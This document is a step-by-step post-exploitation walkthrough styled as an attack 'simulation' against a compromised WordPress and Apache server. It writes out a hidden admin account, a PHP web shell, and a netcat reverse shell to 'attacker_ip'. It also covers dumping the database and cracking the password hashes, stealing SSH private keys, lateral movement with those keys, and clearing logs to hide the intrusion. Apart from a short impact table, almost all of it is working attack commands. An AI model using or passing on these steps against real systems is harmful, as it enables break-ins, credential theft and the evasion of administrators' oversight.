## **🔥 Post-Exploitation Attack Simulation: Taking Over a Compromised Web Server**
---

### **🎯 Scenario Recap**
We have successfully exploited vulnerabilities on **example.com (192.168.1.10)** using:
- **Apache Path Traversal (CVE-2017-15715)** to access `wp-config.php` 📄
- **WordPress Admin Panel Access** via weak password brute-force 🔑
- **Privilege Escalation (CVE-2019-0211)** to obtain **root access** 🔥

Now, let’s simulate **real-world post-exploitation tactics** used by attackers after gaining access.

---

## **🔍 Phase 1: Establishing Persistent Access**
💡 **Objective:** Maintain control over the compromised server **even if rebooted**.

### **🛠 Step 1.1: Creating a New Admin User**
📌 Since we have **WordPress admin access**, we can create a **new admin account**:
```bash
curl -X POST "http://example.com/wp-admin/user-new.php" \
--data "user_login=hacker&user_pass=SuperSecret123!&role=administrator"
```
📌 **Outcome:** We now have a hidden **admin account** in WordPress.

---

### **🛠 Step 1.2: Deploying a Web Shell (Backdoor)**
📌 **Upload a PHP web shell** (e.g., `wpshell.php`) for remote control:
```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```
🚀 **Upload this shell via the WordPress theme editor** or by replacing `index.php` in Apache.

📌 **Access it via:**
```bash
curl http://example.com/wpshell.php?cmd=whoami
```
✅ **Expected Output:** `www-data` (Apache process owner)

---

### **🛠 Step 1.3: Setting Up Reverse Shell**
💡 **A reverse shell allows us to execute commands as if we're inside the system.**

📌 **Step 1.3.1: Start a Netcat listener on our machine**
```bash
nc -lvnp 4444
```
📌 **Step 1.3.2: Run a PHP reverse shell from the web shell**
```bash
curl "http://example.com/wpshell.php?cmd=php -r 'system(\"nc -e /bin/bash attacker_ip 4444\");'"
```
✅ **Outcome:** We get a **remote interactive shell** on the compromised machine.

---

## **🔍 Phase 2: Extracting Sensitive Data**
💡 **Objective:** Exfiltrate critical credentials & user data.

### **🛠 Step 2.1: Dumping MySQL Database**
📌 **Since we have database credentials from `wp-config.php`**, we can dump user info:
```bash
mysql -u root -p"SuperSecurePassword" -e "SELECT user_login, user_pass FROM wp_users;" wordpress_db
```
✅ **Outcome:** We extract **hashed WordPress passwords**.

📌 **Step 2.1.1: Crack WordPress Passwords**
```bash
hashcat -m 400 wp_hashes.txt rockyou.txt --force
```
✅ **Outcome:** We **recover plaintext passwords** of real users.

---

### **🛠 Step 2.2: Searching for SSH Keys**
📌 If an admin uses **SSH key-based authentication**, we can steal keys:
```bash
find /home -name "id_rsa" -exec cat {} \;
```
✅ **Outcome:** We steal **private SSH keys** to access other servers.

---

## **🔍 Phase 3: Lateral Movement (Spreading the Attack)**
💡 **Objective:** Expand access to other systems in the network.

### **🛠 Step 3.1: Check Internal Network**
📌 **Find all active machines inside the network**:
```bash
nmap -sn 192.168.1.0/24
```
✅ **Outcome:** Identifies other internal systems we can attack.

📌 **Step 3.1.1: If SSH is enabled, try stolen credentials**
```bash
ssh -i id_rsa admin@192.168.1.20
```
✅ **Outcome:** If successful, we access a **new machine** inside the network.

---

## **🔍 Phase 4: Covering Tracks**
💡 **Objective:** Hide our presence from logs & alerts.

### **🛠 Step 4.1: Clearing Logs**
📌 **Delete Apache access logs:**
```bash
echo "" > /var/log/apache2/access.log
```
📌 **Delete SSH login logs:**
```bash
echo "" > ~/.bash_history
```
✅ **Outcome:** Erases all signs of our activity.

---

## **💀 Potential Real-World Impact**
| **Attack** | **Impact** |
|------------|-----------|
| **Persistent Backdoor** | Allows continuous control of the server |
| **Database Dump** | Steals user credentials and sensitive data |
| **Lateral Movement** | Expands attack to other systems |
| **Log Cleansing** | Hides traces from administrators |
